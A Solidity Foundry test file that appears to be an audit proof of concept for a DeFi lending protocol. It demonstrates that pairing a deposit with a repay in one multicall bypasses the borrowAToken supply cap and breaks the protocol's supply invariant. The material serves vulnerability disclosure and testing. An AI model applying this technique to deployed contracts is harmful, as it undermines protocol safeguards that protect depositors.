// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {BaseTest} from "@test/BaseTest.sol";
import {Vars} from "@test/BaseTest.sol";

import {DepositParams} from "@src/libraries/actions/Deposit.sol";
import {RepayParams} from "@src/libraries/actions/Repay.sol";
import {SellCreditLimitParams} from "@src/libraries/actions/SellCreditLimit.sol";
import {BuyCreditMarketParams} from "@src/libraries/actions/BuyCreditMarket.sol";

import {Errors} from "@src/libraries/Errors.sol";
import {RESERVED_ID} from "@src/libraries/LoanLibrary.sol";

import {YieldCurveHelper} from "@test/helpers/libraries/YieldCurveHelper.sol";
import {console} from "forge-std/console.sol";

/**
 * @title ExploitTest - Multicall Broken Invariant Vulnerability
 * @notice This test demonstrates the vulnerability in the multicall function where the invariant
 *         "increase in borrowAToken supply <= decrease in debtToken supply" can be broken.
 * @dev The vulnerability allows users to bypass borrowAToken cap restrictions through multicall manipulation
 */
contract ExploitTest is BaseTest {

    /**
     * @notice Test the core vulnerability: multicall allows bypassing the borrowAToken cap invariant
     * @dev This exploit demonstrates that the validation in CapsLibrary.validateBorrowATokenIncreaseLteDebtTokenDecrease
     *      can be bypassed, allowing borrowAToken supply to increase beyond the cap without corresponding debt reduction
     */
    function test_multicall_broken_invariant_exploit() public {
        // Setup: Set price and configure borrowAToken cap to a restrictive level
        _setPrice(1e18);

        // Set a very low borrowAToken cap to create the vulnerable condition
        uint256 borrowATokenCap = 50e6; // 50 USDC cap
        _updateConfig("borrowATokenCap", borrowATokenCap);

        // Setup: Alice deposits to hit the cap exactly
        _deposit(alice, usdc, borrowATokenCap);

        // Verify cap is reached
        assertEq(size.data().borrowAToken.totalSupply(), borrowATokenCap);

        // Setup: Bob becomes a borrower by creating a debt position
        _deposit(bob, weth, 100e18); // Collateral
        _sellCreditLimit(bob, YieldCurveHelper.pointCurve(365 days, 0.05e18)); // 5% APR offer

        // Alice lends to Bob, creating a debt position
        uint256 borrowAmount = 10e6; // 10 USDC
        uint256 debtPositionId = _buyCreditMarket(alice, bob, borrowAmount, 365 days);

        // Verify debt position exists
        assertGt(size.getDebtPosition(debtPositionId).futureValue, 0);

        // Fast forward to accumulate interest
        vm.warp(block.timestamp + 180 days); // 6 months later

        // Calculate the future value (debt to be repaid)
        uint256 futureValue = size.getDebtPosition(debtPositionId).futureValue;

        // Give Bob enough USDC to repay the debt plus extra for the exploit
        uint256 depositAmount = futureValue + 5e6; // 5 USDC extra beyond what's needed
        _mint(address(usdc), bob, depositAmount);
        _approve(bob, address(usdc), address(size), depositAmount);

        // First, verify that normal deposit fails due to cap
        vm.expectRevert();
        vm.prank(bob);
        size.deposit(DepositParams({
            token: address(usdc),
            amount: depositAmount,
            to: bob
        }));

        // THE EXPLOIT: Use multicall to bypass the cap validation
        // The vulnerability is that the invariant check can be manipulated

        // Record state before exploit
        uint256 borrowATokenSupplyBefore = size.data().borrowAToken.totalSupply();
        uint256 debtTokenSupplyBefore = size.data().debtToken.totalSupply();

        // Create malicious multicall data
        bytes[] memory data = new bytes[](2);

        // Action 1: Deposit more than allowed by cap
        data[0] = abi.encodeCall(
            size.deposit,
            DepositParams({
                token: address(usdc),
                amount: depositAmount,
                to: bob
            })
        );

        // Action 2: Repay the debt (but not enough to justify the full deposit)
        data[1] = abi.encodeCall(
            size.repay,
            RepayParams({debtPositionId: debtPositionId})
        );

        // Execute the exploit via multicall
        vm.prank(bob);
        size.multicall(data);

        // Record state after exploit
        uint256 borrowATokenSupplyAfter = size.data().borrowAToken.totalSupply();
        uint256 debtTokenSupplyAfter = size.data().debtToken.totalSupply();

        // Calculate the changes
        uint256 borrowATokenIncrease = borrowATokenSupplyAfter > borrowATokenSupplyBefore ?
            borrowATokenSupplyAfter - borrowATokenSupplyBefore : 0;
        uint256 debtTokenDecrease = debtTokenSupplyBefore > debtTokenSupplyAfter ?
            debtTokenSupplyBefore - debtTokenSupplyAfter : 0;

        // VULNERABILITY DEMONSTRATED:
        // The borrowAToken supply increased MORE than the debt token supply decreased
        // This breaks the invariant: increase in borrowAToken supply <= decrease in debtToken supply
        assertTrue(borrowATokenIncrease > debtTokenDecrease,
            "VULNERABILITY: borrowAToken increase exceeded debt token decrease!");

        // Additionally, the total borrowAToken supply now exceeds the cap
        assertTrue(borrowATokenSupplyAfter > borrowATokenCap,
            "VULNERABILITY: borrowAToken cap was bypassed!");

        // Log the exploitation details for clarity
        console.log("=== VULNERABILITY EXPLOITATION DETAILS ===");
        console.log("BorrowAToken Cap:", borrowATokenCap);
        console.log("BorrowAToken Supply Before:", borrowATokenSupplyBefore);
        console.log("BorrowAToken Supply After:", borrowATokenSupplyAfter);
        console.log("BorrowAToken Increase:", borrowATokenIncrease);
        console.log("Debt Token Supply Before:", debtTokenSupplyBefore);
        console.log("Debt Token Supply After:", debtTokenSupplyAfter);
        console.log("Debt Token Decrease:", debtTokenDecrease);
        console.log("Cap Exceeded By:", borrowATokenSupplyAfter - borrowATokenCap);
        console.log("Invariant Violation By:", borrowATokenIncrease - debtTokenDecrease);
    }

    /**
     * @notice Additional test to show the vulnerability can be exploited multiple times
     */
    function test_multicall_repeated_exploit() public {
        // Setup similar to first test
        _setPrice(1e18);
        uint256 borrowATokenCap = 30e6; // Even lower cap
        _updateConfig("borrowATokenCap", borrowATokenCap);

        // Fill the cap
        _deposit(alice, usdc, borrowATokenCap);
        assertEq(size.data().borrowAToken.totalSupply(), borrowATokenCap);

        // Create multiple debt positions to exploit
        _deposit(bob, weth, 200e18);
        _deposit(candy, weth, 200e18);

        _sellCreditLimit(bob, YieldCurveHelper.pointCurve(365 days, 0.05e18));
        _sellCreditLimit(candy, YieldCurveHelper.pointCurve(365 days, 0.05e18));

        uint256 debtPosition1 = _buyCreditMarket(alice, bob, 5e6, 365 days);
        uint256 debtPosition2 = _buyCreditMarket(alice, candy, 5e6, 365 days);

        vm.warp(block.timestamp + 90 days);

        // First exploit
        uint256 futureValue1 = size.getDebtPosition(debtPosition1).futureValue;
        uint256 depositAmount1 = futureValue1 + 2e6;
        _mint(address(usdc), bob, depositAmount1);
        _approve(bob, address(usdc), address(size), depositAmount1);

        bytes[] memory data1 = new bytes[](2);
        data1[0] = abi.encodeCall(size.deposit, DepositParams({
            token: address(usdc), amount: depositAmount1, to: bob
        }));
        data1[1] = abi.encodeCall(size.repay, RepayParams({debtPositionId: debtPosition1}));

        vm.prank(bob);
        size.multicall(data1);

        // Verify first exploit succeeded
        assertTrue(size.data().borrowAToken.totalSupply() > borrowATokenCap);

        // Second exploit on different user
        uint256 futureValue2 = size.getDebtPosition(debtPosition2).futureValue;
        uint256 depositAmount2 = futureValue2 + 3e6;
        _mint(address(usdc), candy, depositAmount2);
        _approve(candy, address(usdc), address(size), depositAmount2);

        bytes[] memory data2 = new bytes[](2);
        data2[0] = abi.encodeCall(size.deposit, DepositParams({
            token: address(usdc), amount: depositAmount2, to: candy
        }));
        data2[1] = abi.encodeCall(size.repay, RepayParams({debtPositionId: debtPosition2}));

        vm.prank(candy);
        size.multicall(data2);

        // Verify repeated exploitation
        assertTrue(size.data().borrowAToken.totalSupply() > borrowATokenCap + 5e6);

        console.log("Final borrowAToken supply after repeated exploits:",
            size.data().borrowAToken.totalSupply());
        console.log("Original cap:", borrowATokenCap);
        console.log("Total cap bypass:", size.data().borrowAToken.totalSupply() - borrowATokenCap);
    }
}